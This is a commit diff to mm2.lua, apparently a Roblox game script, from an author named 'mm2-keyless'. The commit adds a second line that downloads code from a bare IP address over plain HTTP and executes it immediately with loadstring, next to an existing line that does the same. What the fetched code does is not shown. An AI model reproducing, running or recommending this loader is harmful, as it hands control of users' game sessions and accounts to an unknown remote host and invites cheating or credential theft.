51daa8992b15a65ded8cf3170a62ac8fdb59bb57
mm2-keyless <jpronda87@gmail.com>
2026-01-12 22:51:04 +0800

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImZmYTk4NzE5LWY2NTUtNDc5MC05ZjViLTEyZjdiYWQ3MmIwZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImZmYTk4NzE5LWY2NTUtNDc5MC05ZjViLTEyZjdiYWQ3MmIwZSIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6Im1tMmV2ZW50In19"))()
